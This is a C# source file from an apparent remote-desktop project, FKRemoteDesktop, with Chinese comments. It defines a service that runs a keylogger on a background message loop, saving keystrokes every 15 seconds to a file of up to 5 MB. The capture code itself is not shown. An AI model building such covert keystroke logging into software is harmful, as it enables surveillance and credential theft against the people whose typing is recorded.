using System;
using System.Threading;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.KeyLogger
{
    public class KeyloggerService : IDisposable
    {
        private readonly Thread _msgLoopThread;         // 记录按键信息的线程
        private ApplicationContext _msgLoop;            // 接收按键事件的消息循环
        private Keylogger _keylogger;                   // 按键事件的功能函数类

        public KeyloggerService()
        {
            _msgLoopThread = new Thread(() =>
            {
                _msgLoop = new ApplicationContext();
                _keylogger = new Keylogger(15000, 5 * 1024 * 1024); // 15s进行一次保存，最大文件大小5M
                _keylogger.Start();
                Application.Run(_msgLoop);
            });
        }

        public void Start()
        {
            _msgLoopThread.Start();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected void Dispose(bool disposing)
        {
            if (disposing)
            {
                _keylogger.Dispose();
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
            }
        }
    }
}